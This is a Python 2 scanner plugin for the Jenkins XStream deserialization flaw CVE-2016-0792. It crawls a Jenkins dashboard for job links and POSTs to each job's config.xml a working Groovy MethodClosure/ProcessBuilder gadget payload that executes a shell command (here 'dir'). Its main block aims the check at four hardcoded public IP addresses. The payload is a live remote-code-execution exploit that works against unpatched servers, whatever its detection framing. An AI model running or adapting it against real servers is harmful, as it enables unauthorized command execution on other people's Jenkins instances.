#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = CVE-2016-0792
#___From___ = https://github.com/brianwrf/hackUtils
import re
import HTMLParser

def assign(service, arg):
    if service == 'jenkins':
        return True, arg


def getCodeFromUrl(url):
    return curl.curl2(url)[0]


def getJenkinsUrl(url):
    if getCodeFromUrl(url+"jenkins/") == 200:
        return url+"jenkins/"
    if getCodeFromUrl(url[:-1]+":8080/jenkins/") == 200:
        return url[:-1]+":8080/jenkins/"
    if getCodeFromUrl(url[:-1]+":8080/") == 200:
        return url[:-1]+":8080/"
    return url


class JenkinsParser(HTMLParser.HTMLParser):
    def __init__(self):
        HTMLParser.HTMLParser.__init__(self)
        self.url_job = []
        self._div = 0
        self._table = 0
        self._a = 0

    def handle_starttag(self, tag, attrs):
        if tag == "div":
            if self._div > 0:
                self._div += 1
            elif (("class", "dashboard") in attrs):
                self._div = 1
        if tag == "table":
            if self._table > 0:
                self._table += 1
            elif (("id", "projectstatus") in attrs):
                self._table = 1
        if tag == "a":
            if self._a > 0:
                self._a += 1
            elif (("class", "model-link inside") in attrs):
                self._a = 1
        if self._div and self._table and self._a:
            for i1, i2 in attrs:
                if i1 == "href":
                    self.url_job.append(i2)

    def handle_endtag(self, tag):
        if tag == "div" and self._div:
            self._div -= 1
        if tag == "table" and self._table:
            self._table -= 1
        if tag == "a" and self._table:
            self._a -= 1

    def get_url_job(self):
        return self.url_job


def getConfigXmlFromUrl(url):
    code, head, body, err, _ = curl.curl2(url)
    JP = JenkinsParser()
    JP.feed(body)
    return [u+"config.xml" for u in JP.get_url_job()]


def audit(arg):
    payload = "<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/><owner class=\"java.lang.ProcessBuilder\"><command><string>dir</string></command><redirectErrorStream>false</redirectErrorStream></owner><resolveStrategy>0</resolveStrategy><directive>0</directive><parameterTypes/><maximumNumberOfParameters>0</maximumNumberOfParameters><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>"
    jenkins_url = getJenkinsUrl(arg)
    for path in getConfigXmlFromUrl(jenkins_url):
        target = jenkins_url + path
        code, head, body, errcode, final_url = curl.curl2(target, post=payload)
        reg = '.*java.io.IOException: Unable to read([^<>]*?)at hudson\.XmlFile\.*'
        if code==500 and re.findall(reg, body):
            security_hole(target+" has CVE-2016-0792")


if __name__ == '__main__':
    from dummy import *
    audit(assign('jenkins', 'http://66.228.49.222/')[1])
    audit(assign('jenkins', 'http://104.197.245.179/')[1])
    audit(assign('jenkins', 'http://104.197.245.179/jenkins/')[1])
    audit(assign('jenkins', 'http://40.117.234.217/')[1])